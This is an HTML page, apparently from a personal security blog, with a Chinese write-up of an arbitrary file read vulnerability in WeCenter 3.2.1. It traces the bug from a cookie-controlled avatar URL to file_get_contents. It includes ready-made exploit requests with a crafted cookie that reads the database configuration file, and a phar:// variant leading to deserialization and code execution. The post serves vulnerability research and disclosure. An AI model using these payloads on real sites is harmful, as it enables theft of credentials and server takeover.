@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>Wecenter3.2.1任意文件读取 - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=PHP>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">Wecenter3.2.1任意文件读取</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2019-09-03</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <p>很久没做审计了，博客都长草了，发个一年前审Wecenter发现的任意文件读取漏洞吧~</p>
+<p>审的时候是3.2.1版本，现在官网不能直接下，但是<a href="https://github.com/wecenter/wecenter">github</a>上的也差不多</p>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞发生在models\openid\weixin\weixin.php:254行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">associate_avatar</span>(<span class="params"><span class="variable">$uid</span>, <span class="variable">$headimgurl</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$headimgurl</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$user_info</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;account&#x27;</span>)-&gt;<span class="title function_ invoke__">get_user_info_by_uid</span>(<span class="variable">$uid</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user_info</span>[<span class="string">&#x27;avatar_file&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$avatar_stream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$headimgurl</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$avatar_location</span> = <span class="title function_ invoke__">get_setting</span>(<span class="string">&#x27;upload_dir&#x27;</span>) . <span class="string">&#x27;/avatar/&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;account&#x27;</span>)-&gt;<span class="title function_ invoke__">get_avatar</span>(<span class="variable">$uid</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>) . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;account&#x27;</span>)-&gt;<span class="title function_ invoke__">get_avatar</span>(<span class="variable">$uid</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable">$avatar_dir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$avatar_location</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$avatar_location</span>);</span><br><span class="line">            <span class="keyword">if</span> ( ! <span class="title function_ invoke__">is_dir</span>(<span class="variable">$avatar_dir</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">make_dir</span>(<span class="variable">$avatar_dir</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$avatar_location</span>, <span class="variable">$avatar_stream</span>))   <span class="comment">//bug</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的代码中，读取了$headimgurl中的文件内容，然后将这部分内容写进了用户头像，jpg文件！</p>
+<p>全局搜索associate_avatar的调用，在同文件models\openid\weixin\weixin.php:180行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind_account</span>(<span class="params"><span class="variable">$access_user</span>, <span class="variable">$access_token</span>, <span class="variable">$uid</span>, <span class="variable">$is_ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$access_user</span>[<span class="string">&#x27;nickname&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//退出操作</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$openid_info</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_user_info_by_uid</span>(<span class="variable">$uid</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//退出操作</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;users_weixin&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;uid&#x27;</span> =&gt; <span class="title function_ invoke__">intval</span>(<span class="variable">$uid</span>),</span><br><span class="line">        <span class="string">&#x27;openid&#x27;</span> =&gt; <span class="variable">$access_token</span>[<span class="string">&#x27;openid&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;expires_in&#x27;</span> =&gt; (<span class="title function_ invoke__">time</span>() + <span class="variable">$access_token</span>[<span class="string">&#x27;expires_in&#x27;</span>]),</span><br><span class="line">        <span class="string">&#x27;access_token&#x27;</span> =&gt; <span class="variable">$access_token</span>[<span class="string">&#x27;access_token&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;refresh_token&#x27;</span> =&gt; <span class="variable">$access_token</span>[<span class="string">&#x27;refresh_token&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;scope&#x27;</span> =&gt; <span class="variable">$access_token</span>[<span class="string">&#x27;scope&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;headimgurl&#x27;</span> =&gt; <span class="variable">$access_user</span>[<span class="string">&#x27;headimgurl&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;nickname&#x27;</span> =&gt; <span class="variable">$access_user</span>[<span class="string">&#x27;nickname&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;sex&#x27;</span> =&gt; <span class="variable">$access_user</span>[<span class="string">&#x27;sex&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;province&#x27;</span> =&gt; <span class="variable">$access_user</span>[<span class="string">&#x27;province&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;city&#x27;</span> =&gt; <span class="variable">$access_user</span>[<span class="string">&#x27;city&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;country&#x27;</span> =&gt; <span class="variable">$access_user</span>[<span class="string">&#x27;country&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;add_time&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>()</span><br><span class="line">    )); </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">associate_avatar</span>(<span class="variable">$uid</span>, <span class="variable">$access_user</span>[<span class="string">&#x27;headimgurl&#x27;</span>]);  <span class="comment">//bug</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;account&#x27;</span>)-&gt;<span class="title function_ invoke__">associate_remote_avatar</span>(<span class="variable">$uid</span>, <span class="variable">$access_user</span>[<span class="string">&#x27;headimgurl&#x27;</span>]);   <span class="comment">//bug2 </span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>bind_account函数最后会调用漏洞函数，以及另外一个相同漏洞的函数&#x2F;&#x2F;bug2，这里不贴代码了</p>
+<p>继续搜索调用点，在手机应用文件app\m\weixin.php:240行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">binding_action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[G_COOKIE_PREFIX . <span class="string">&#x27;_WXConnect&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$WXConnect</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_COOKIE</span>[G_COOKIE_PREFIX . <span class="string">&#x27;_WXConnect&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$WXConnect</span>[<span class="string">&#x27;access_token&#x27;</span>][<span class="string">&#x27;openid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;openid_weixin_weixin&#x27;</span>)-&gt;<span class="title function_ invoke__">bind_account</span>(<span class="variable">$WXConnect</span>[<span class="string">&#x27;access_user&#x27;</span>], <span class="variable">$WXConnect</span>[<span class="string">&#x27;access_token&#x27;</span>], <span class="variable">$this</span>-&gt;user_id);</span><br></pre></td></tr></table></figure>
+<p>到了这里，可以看到我们漏洞点的数据来源与$_COOKIE中的一个参数<code>$_COOKIE[G_COOKIE_PREFIX . &#39;_WXConnect&#39;]</code>，可控</p>
+<p>倒回去梳理一下，中间过程仅有一些判断，只需要满足：</p>
+<ol>
+<li><code>$WXConnect[&#39;access_token&#39;][&#39;openid&#39;]</code>存在</li>
+<li><code>$access_user[&#39;nickname&#39;]</code>存在</li>
+<li><code>$openid_info = $this-&gt;get_user_info_by_uid($uid)</code>为False</li>
+<li><code>$user_info = $this-&gt;model(&#39;account&#39;)-&gt;get_user_info_by_uid($uid)</code>为True，且<code>$user_info[&#39;avatar_file&#39;]</code>为False</li>
+</ol>
+<p>第1、2点只需要在cookie中传入对应的变量即可</p>
+<p>第3点判断$openid_info是否为空，而未绑定微信则查询默认为空，即False</p>
+<p>第4点说明需要用户登录，且数据库中头像为空</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol>
+<li>注册账户，登录后无视邮箱验证</li>
+<li>构造payload读取数据库配置文件，其中XXX前缀查看其余cookie可得<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">/?/m/weixin/binding/</span><br><span class="line"></span><br><span class="line">XXX__Session=...;</span><br><span class="line">XXX__user_login=...;</span><br><span class="line">XXX__WXConnect=&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:1&#125;,&quot;access_user&quot;:&#123;&quot;nickname&quot;:&quot;aaa&quot;,&quot;openid&quot;:1,&quot;headimgurl&quot;:&quot;system/config/database.php&quot;&#125;&#125;; </span><br></pre></td></tr></table></figure>
+执行后会报错返回头像路径<br><img src="/2019/09/03/Wecenter-Any-File-Read/1.png"></li>
+</ol>
+<p>请求头像路径查看<br><img src="/2019/09/03/Wecenter-Any-File-Read/2.png"></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>另外由于进行上述利用绑定微信后，会将绑定信息写入数据库，并更新数据库用户头像，也就是说会因为第3、4点判断限制，无法继续利用</p>
+<p>解决办法就是通过访问如下链接进行解绑操作<br><a href="http://127.0.0.1/?/account/ajax/unbinding_weixin/">http://127.0.0.1/?/account/ajax/unbinding_weixin/</a></p>
+<p>当然还可以再注册账户~</p>
+<h2 id="20200117补充"><a href="#20200117补充" class="headerlink" title="20200117补充"></a>20200117补充</h2><p>某位师傅在先知论坛发表了一篇WeCenter v3.3.4的getshell，看了一下发现实际也是利用这里的，orz</p>
+<p>方法就是，上传一个phar包，然后发送包触发发序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">/?/m/weixin/binding/</span><br><span class="line"></span><br><span class="line">XXX__Session=...;</span><br><span class="line">XXX__user_login=...;</span><br><span class="line">XXX__WXConnect=&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:1&#125;,&quot;access_user&quot;:&#123;&quot;nickname&quot;:&quot;aaa&quot;,&quot;openid&quot;:1,&quot;headimgurl&quot;:&quot;phar://filepath&quot;&#125;&#125;; </span><br></pre></td></tr></table></figure>
+<p>而触发的漏洞点则是利用了很久之前的一个反序列点执行任意sql语句的漏洞，触发点同样也是这里，总之这里的代码写的太随便了</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://xz.aliyun.com/t/7077">https://xz.aliyun.com/t/7077</a><br><a href="https://www.leavesongs.com/PENETRATION/wecenter-unserialize-arbitrary-sql-execute.html">https://www.leavesongs.com/PENETRATION/wecenter-unserialize-arbitrary-sql-execute.html</a></p>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
